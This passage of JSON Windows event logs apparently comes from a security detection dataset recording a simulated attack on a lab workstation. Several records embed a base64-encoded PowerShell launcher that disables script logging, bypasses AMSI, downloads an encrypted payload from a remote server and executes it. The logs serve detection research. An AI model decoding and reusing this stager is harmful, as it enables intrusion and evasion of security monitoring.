wATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAUgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBFAHQARgBJAEUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUARQAoACQATgBVAEwATAAsACgATgBlAFcALQBPAEIASgBlAGMAdAAgAEMATwBMAGwARQBDAHQASQBPAE4AUwAuAEcAZQBuAEUAcgBpAGMALgBIAEEAcwBIAFMARQBUAFsAUwBUAHIAaQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUAZgBdAC4AQQBTAFMAZQBNAEIAbABZAC4ARwBFAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUAZQAoACQATgB1AGwATAAsACQAdAByAHUAZQApADsAfQA7AFsAUwBZAHMAdABFAE0ALgBOAGUAVAAuAFMARQBSAFYASQBjAGUAUABPAEkATgB0AE0AQQBuAEEAZwBFAHIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBPAG4AVABJAG4AVQBFAD0AMAA7ACQANQA3ADkAMwA9AE4AZQB3AC0ATwBCAGoARQBjAFQAIABTAFkAUwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAGkARQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAG4AQwBvAGQASQBuAEcAXQA6ADoAVQBOAEkAQwBPAEQAZQAuAEcARQB0AFMAVABSAGkATgBHACgAWwBDAG8AbgB2AGUAUgBUAF0AOgA6AEYAUgBPAG0AQgBBAFMARQA2ADQAUwB0AHIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADcAOQAzAC4ASABFAGEARABFAHIAUwAuAEEARABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANQA3ADkAMwAuAFAAUgBPAFgAWQA9AFsAUwB5AFMAVABFAE0ALgBOAEUAVAAuAFcAZQBiAFIARQBRAFUARQBTAHQAXQA6ADoARABlAEYAYQBVAEwAdABXAEUAQgBQAFIAbwBYAHkAOwAkADUANwA5ADMALgBQAFIAbwBYAHkALgBDAFIAZQBEAEUATgBUAGkAQQBMAHMAIAA9ACAAWwBTAFkAcwBUAEUATQAuAE4ARQBUAC4AQwBSAGUAZABFAG4AVABJAGEATABDAEEAQwBoAGUAXQA6ADoARABFAEYAQQBVAGwAdABOAGUAVABXAG8AcgBrAEMAUgBFAGQAZQBuAHQASQBhAEwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADcAOQAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAEUATQAuAFQAZQBYAHQALgBFAG4AYwBPAEQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgB5AFQARQBzACgAJwAwAF0AcgBYADMAWQA0ADoAKAApAEoAYwBoAEEASwBrAFIANwBWAGcAKwBbAC8AVQBwADkAMgB0AG0ARwBRAHYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAA1ADcAOQAzAC4ASABFAEEARABFAHIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgB1AG8AUwBXAG8AaABuAGwAQwBZAGwAZgA9AEwAdwBMAHcAbwBiADAAZABMAEsATQBJAHQAUgBVAEgAOABnAEMAdQBWAEcAYgBBAGQAZABzAD0AIgApADsAJABkAEEAVABhAD0AJAA1ADcAOQAzAC4ARABvAHcAbgBsAG8AYQBkAEQAQQBUAEEAKAAkAFMARQByACsAJABUACkAOwAkAGkAVgA9ACQAZABBAHQAQQBbADAALgAuADMAXQA7ACQARABhAHQAYQA9ACQAZABBAHQAYQBbADQALgAuACQARABBAHQAQQAuAGwARQBOAEcAVABIAF0AOwAtAGoATwBJAG4AWwBDAEgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 9da16ef2-d692-4dfe-ad5e-370bbf001fb9\r\n        Pipeline ID = 1\r\n        Command Name = Format-Table\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 16301\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","SourceName":"Microsoft-Windows-PowerShell","Version":1,"Category":"Executing Pipeline","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":-9223372036854775808,"SeverityValue":2,"PipeName":"&lt;Anonymous Pipe&gt;","EventTypeOrignal":"INFO","EventID":17,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"host":"wec.internal.cloudapp.net","Channel":"Microsoft-Windows-Sysmon/Operational","UserID":"S-1-5-18","AccountType":"User","ThreadID":4048,"ProcessGuid":"{b34bc01c-2f95-5f69-5f01-000000000900}","EventReceivedTime":"2020-09-21 19:35:37","Opcode":"Info","EventTime":"2020-09-21 19:35:37","@timestamp":"2020-09-21T23:35:37.908Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3230296,"Task":17,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":1,"Image":"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Category":"Pipe Created (rule: PipeEvent)","UtcTime":"2020-09-21 23:35:37.143","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":36028797018963968,"SeverityValue":2,"EventReceivedTime":"2020-09-21 19:35:37","EventID":800,"ExecutionProcessID":0,"Channel":"Windows PowerShell","host":"wec.internal.cloudapp.net","ThreadID":0,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-21 19:35:37","Message":"Pipeline execution details for command line:             $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=16306\r\n\r\n\tUserId=THESHIRE\\pgustavo\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=1372cbf7-30b6-4e48-bce6-058659e77cf4\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAQgBMAGUALgBQAFMAVgBlAHIAUwBJAE8ATgAuAE0AQQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJABDADMAMgAyAD0AWwByAGUAZgBdAC4AQQBzAHMARQBNAEIAbABZAC4ARwBlAHQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkAEMAMwAyADIAKQB7ACQAYwA3ADQAMgA9ACQAQwAzADIAMgAuAEcARQB0AFYAQQBsAFUAZQAoACQAbgB1AGwATAApADsASQBGACgAJABjADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAQwA3ADQAMgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABDADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAEwAPQBbAEMATwBMAEwARQBjAHQAaQBvAG4AcwAuAEcARQBOAGUAUgBpAEMALgBEAGkAQwB0AGkAbwBOAEEAcgB5AFsAUwB0AFIASQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBKAGUAYwBUAF0AXQA6ADoATgBFAHcAKAApADsAJAB2AEEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEATAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGMANwA0ADIAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAUgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBFAHQARgBJAEUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUARQAoACQATgBVAEwATAAsACgATgBlAFcALQBPAEIASgBlAGMAdAAgAEMATwBMAGwARQBDAHQASQBPAE4AUwAuAEcAZQBuAEUAcgBpAGMALgBIAEEAcwBIAFMARQBUAFsAUwBUAHIAaQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUAZgBdAC4AQQBTAFMAZQBNAEIAbABZAC4ARwBFAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUAZQAoACQATgB1AGwATAAsACQAdAByAHUAZQApADsAfQA7AFsAUwBZAHMAdABFAE0ALgBOAGUAVAAuAFMARQBSAFYASQBjAGUAUABPAEkATgB0AE0AQQBuAEEAZwBFAHIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBPAG4AVABJAG4AVQBFAD0AMAA7ACQANQA3ADkAMwA9AE4AZQB3AC0ATwBCAGoARQBjAFQAIABTAFkAUwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAGkARQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAG4AQwBvAGQASQBuAEcAXQA6ADoAVQBOAEkAQwBPAEQAZQAuAEcARQB0AFMAVABSAGkATgBHACgAWwBDAG8AbgB2AGUAUgBUAF0AOgA6AEYAUgBPAG0AQgBBAFMARQA2ADQAUwB0AHIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADcAOQAzAC4ASABFAGEARABFAHIAUwAuAEEARABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANQA3ADkAMwAuAFAAUgBPAFgAWQA9AFsAUwB5AFMAVABFAE0ALgBOAEUAVAAuAFcAZQBiAFIARQBRAFUARQBTAHQAXQA6ADoARABlAEYAYQBVAEwAdABXAEUAQgBQAFIAbwBYAHkAOwAkADUANwA5ADMALgBQAFIAbwBYAHkALgBDAFIAZQBEAEUATgBUAGkAQQBMAHMAIAA9ACAAWwBTAFkAcwBUAEUATQAuAE4ARQBUAC4AQwBSAGUAZABFAG4AVABJAGEATABDAEEAQwBoAGUAXQA6ADoARABFAEYAQQBVAGwAdABOAGUAVABXAG8AcgBrAEMAUgBFAGQAZQBuAHQASQBhAEwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADcAOQAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAEUATQAuAFQAZQBYAHQALgBFAG4AYwBPAEQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgB5AFQARQBzACgAJwAwAF0AcgBYADMAWQA0ADoAKAApAEoAYwBoAEEASwBrAFIANwBWAGcAKwBbAC8AVQBwADkAMgB0AG0ARwBRAHYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAA1ADcAOQAzAC4ASABFAEEARABFAHIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgB1AG8AUwBXAG8AaABuAGwAQwBZAGwAZgA9AEwAdwBMAHcAbwBiADAAZABMAEsATQBJAHQAUgBVAEgAOABnAEMAdQBWAEcAYgBBAGQAZABzAD0AIgApADsAJABkAEEAVABhAD0AJAA1ADcAOQAzAC4ARABvAHcAbgBsAG8AYQBkAEQAQQBUAEEAKAAkAFMARQByACsAJABUACkAOwAkAGkAVgA9ACQAZABBAHQAQQBbADAALgAuADMAXQA7ACQARABhAHQAYQA9ACQAZABBAHQAYQBbADQALgAuACQARABBAHQAQQAuAGwARQBOAEcAVABIAF0AOwAtAGoATwBJAG4AWwBDAEgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=9da16ef2-d692-4dfe-ad5e-370bbf001fb9\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=            $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;\n \r\n\r\nDetails: \r\nCommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.Security.Cryptography.AesCryptoServiceProvider\"\r\n","@timestamp":"2020-09-21T23:35:37.909Z","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":185120,"Task":8,"@version":"1","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"PowerShell","Category":"Pipeline Execution Details","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":0,"SeverityValue":2,"EventReceivedTime":"2020-09-21 19:35:37","EventID":4103,"ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","ExecutionProcessID":7456,"Channel":"Microsoft-Windows-PowerShell/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ActivityID":"{3AF69DEC-79B4-0001-DEFC-0B856290D601}","UserID":"S-1-5-21-4228717743-1032521047-1810997296-1104","ThreadID":840,"EventType":"INFO","Opcode":"To be used when operation is just executing a method","EventTime":"2020-09-21 19:35:37","@timestamp":"2020-09-21T23:35:37.911Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"pgustavo","RecordNumber":163834,"Payload":"CommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"Byte[]\"\r\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"768\"\r\n","Task":106,"Domain":"THESHIRE","@version":"1","OpcodeValue":20,"SourceModuleName":"eventlog","ERROR_EVT_UNRESOLVED":true,"Severity":"INFO","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = 1372cbf7-30b6-4e48-bce6-058659e77cf4\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAQgBMAGUALgBQAFMAVgBlAHIAUwBJAE8ATgAuAE0AQQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJABDADMAMgAyAD0AWwByAGUAZgBdAC4AQQBzAHMARQBNAEIAbABZAC4ARwBlAHQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkAEMAMwAyADIAKQB7ACQAYwA3ADQAMgA9ACQAQwAzADIAMgAuAEcARQB0AFYAQQBsAFUAZQAoACQAbgB1AGwATAApADsASQBGACgAJABjADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAQwA3ADQAMgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABDADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAEwAPQBbAEMATwBMAEwARQBjAHQAaQBvAG4AcwAuAEcARQBOAGUAUgBpAEMALgBEAGkAQwB0AGkAbwBOAEEAcgB5AFsAUwB0AFIASQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBKAGUAYwBUAF0AXQA6ADoATgBFAHcAKAApADsAJAB2AEEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEATAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGMANwA0ADIAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAUgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBFAHQARgBJAEUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUARQAoACQATgBVAEwATAAsACgATgBlAFcALQBPAEIASgBlAGMAdAAgAEMATwBMAGwARQBDAHQASQBPAE4AUwAuAEcAZQBuAEUAcgBpAGMALgBIAEEAcwBIAFMARQBUAFsAUwBUAHIAaQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUAZgBdAC4AQQBTAFMAZQBNAEIAbABZAC4ARwBFAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUAZQAoACQATgB1AGwATAAsACQAdAByAHUAZQApADsAfQA7AFsAUwBZAHMAdABFAE0ALgBOAGUAVAAuAFMARQBSAFYASQBjAGUAUABPAEkATgB0AE0AQQBuAEEAZwBFAHIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBPAG4AVABJAG4AVQBFAD0AMAA7ACQANQA3ADkAMwA9AE4AZQB3AC0ATwBCAGoARQBjAFQAIABTAFkAUwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAGkARQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAG4AQwBvAGQASQBuAEcAXQA6ADoAVQBOAEkAQwBPAEQAZQAuAEcARQB0AFMAVABSAGkATgBHACgAWwBDAG8AbgB2AGUAUgBUAF0AOgA6AEYAUgBPAG0AQgBBAFMARQA2ADQAUwB0AHIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADcAOQAzAC4ASABFAGEARABFAHIAUwAuAEEARABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANQA3ADkAMwAuAFAAUgBPAFgAWQA9AFsAUwB5AFMAVABFAE0ALgBOAEUAVAAuAFcAZQBiAFIARQBRAFUARQBTAHQAXQA6ADoARABlAEYAYQBVAEwAdABXAEUAQgBQAFIAbwBYAHkAOwAkADUANwA5ADMALgBQAFIAbwBYAHkALgBDAFIAZQBEAEUATgBUAGkAQQBMAHMAIAA9ACAAWwBTAFkAcwBUAEUATQAuAE4ARQBUAC4AQwBSAGUAZABFAG4AVABJAGEATABDAEEAQwBoAGUAXQA6ADoARABFAEYAQQBVAGwAdABOAGUAVABXAG8AcgBrAEMAUgBFAGQAZQBuAHQASQBhAEwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADcAOQAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAEUATQAuAFQAZQBYAHQALgBFAG4AYwBPAEQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgB5AFQARQBzACgAJwAwAF0AcgBYADMAWQA0ADoAKAApAEoAYwBoAEEASwBrAFIANwBWAGcAKwBbAC8AVQBwADkAMgB0AG0ARwBRAHYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAA1ADcAOQAzAC4ASABFAEEARABFAHIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgB1AG8AUwBXAG8AaABuAGwAQwBZAGwAZgA9AEwAdwBMAHcAbwBiADAAZABMAEsATQBJAHQAUgBVAEgAOABnAEMAdQBWAEcAYgBBAGQAZABzAD0AIgApADsAJABkAEEAVABhAD0AJAA1ADcAOQAzAC4ARABvAHcAbgBsAG8AYQBkAEQAQQBUAEEAKAAkAFMARQByACsAJABUACkAOwAkAGkAVgA9ACQAZABBAHQAQQBbADAALgAuADMAXQA7ACQARABhAHQAYQA9ACQAZABBAHQAYQBbADQALgAuACQARABBAHQAQQAuAGwARQBOAEcAVABIAF0AOwAtAGoATwBJAG4AWwBDAEgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\n        Engine Version = 